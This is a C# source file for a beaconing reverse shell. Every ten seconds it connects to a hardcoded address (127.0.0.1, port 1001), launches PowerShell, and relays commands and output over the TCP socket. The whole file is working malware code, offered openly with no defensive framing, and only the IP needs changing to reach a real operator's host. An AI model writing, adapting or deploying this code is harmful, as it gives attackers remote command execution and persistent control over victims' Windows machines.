using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;

namespace beaconing
{
    public class Program
    {
        static StreamWriter writer;
        static StreamReader reader;
        public static void Main(string[] args)
        {
            String IP_Address = "127.0.0.1";
            int Port = 1001;
            while (true)
            {
                Console.WriteLine("Sleeping...");
                System.Threading.Thread.Sleep(10000);
                Console.WriteLine("Calling GiveShell()");
                GiveShell(IP_Address, Port);
            }
        }
        public static void GiveShell(String IP_Address, int Port)
        {
            TcpClient client = ConnectMeDaddy(IP_Address, Port);

            if (client != null)
            {
                Console.WriteLine(String.Format("Connected to {0}:{1}!", IP_Address, Port));
                var stream = client.GetStream();
                writer = new StreamWriter(stream);
                reader = new StreamReader(stream);

                StringBuilder StrInput = new StringBuilder();
                Process p = new Process();
                try
                {
                    Console.WriteLine("Starting PowerShell.exe");
                    p.StartInfo.FileName = "powershell.exe";
                    p.StartInfo.CreateNoWindow = false; // for debugging
                    p.StartInfo.UseShellExecute = false;
                    // https://stackoverflow.com/questions/5255086/when-do-we-need-to-set-useshellexecute-to-true
                    // https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.useshellexecute?view=netframework-4.0
                    // Basically just means: "Gets or sets a value indicating whether to use the operating system shell to start the process."
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.OutputDataReceived += new DataReceivedEventHandler(OutputHandler);
                    p.Start();
                    p.BeginOutputReadLine();
                    while (true)
                    {
                        StrInput.Append(reader.ReadLine());
                        p.StandardInput.WriteLine(StrInput);
                        StrInput.Remove(0, StrInput.Length);
                    }
                }
                catch
                {
                    Console.WriteLine("Shit died");
                }
                finally
                {
                    Console.WriteLine("Closing streams and stuff");
                    stream.Close();
                    reader.Close();
                    writer.Close();
                    client.Close();
                    p.Close();
                }
            }
            
        }
       public static TcpClient ConnectMeDaddy(String IP_Address, int Port)
        {
            Console.WriteLine(String.Format("Connecting to {0}:{1}", IP_Address, Port));
            TcpClient client = null;

            try
            {
                
                client = new TcpClient(IP_Address, Port);
            }
            catch
            {
                Console.WriteLine(String.Format("Failed to connect to {0}:{1} :(", IP_Address, Port));
                client = null;
            }
            return client;
        }
        public static void OutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    writer.WriteLine(strOutput);
                    writer.Flush();
                }
                catch (Exception err) { }
            }
        }

    }

}

